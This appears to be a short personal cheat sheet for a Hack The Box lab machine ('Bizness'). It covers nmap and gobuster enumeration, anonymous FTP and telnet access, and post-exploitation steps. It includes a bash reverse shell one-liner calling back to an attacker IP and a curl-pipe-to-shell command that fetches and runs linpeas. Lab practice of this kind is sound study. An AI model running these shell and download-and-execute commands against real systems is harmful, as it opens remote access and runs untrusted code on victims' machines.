
`ip=10.10.10.1;`
`url=http://bizness.htb/`

# tips
- kill all openvpn connections `sudo killall openvpn`


# enumeration
- # nmap
    - `sudo nmap -sC -sV -oA scans/nmap --open -v $ip`



- # got a hostname
    - `sudo nano /etc/hosts`

- # www
    - gobuster 
        - directory `gobuster dir -u $url -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt -k -t 30 -b 302 -o scans/dir.gobuster`
            - exclude status code `-b 301, 404`
        - files `gobuster dir -u $url -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt -k -t 30 -b 301 -x html,php -o scans/files.gobuster`
        - `--exclude-length 3400-3500`




# port attack
- 21 ftp
    - `ftp $ip`
        - use `anonymous` as name
    - `dir` or `ls` or `ls -a` to list files
- 23 telnet
    - `telnet $ip`


# shells
- bash
    - `sh -i >& /dev/tcp/0.10.14.30/9001 0>&1`

# simple web server
- `python3 -m http.server`




# got shell?

- ## linux
- linpeas
    - `curl -L http://10.10.14.30/linpeas.sh | sh`
- sudo version `sudo -V | grep "Sudo ver"` 
  



- ## windows





- powershell
    - first 10 lines of a file `Get-Content .\20240125-0800-1900.csv | select -First 10`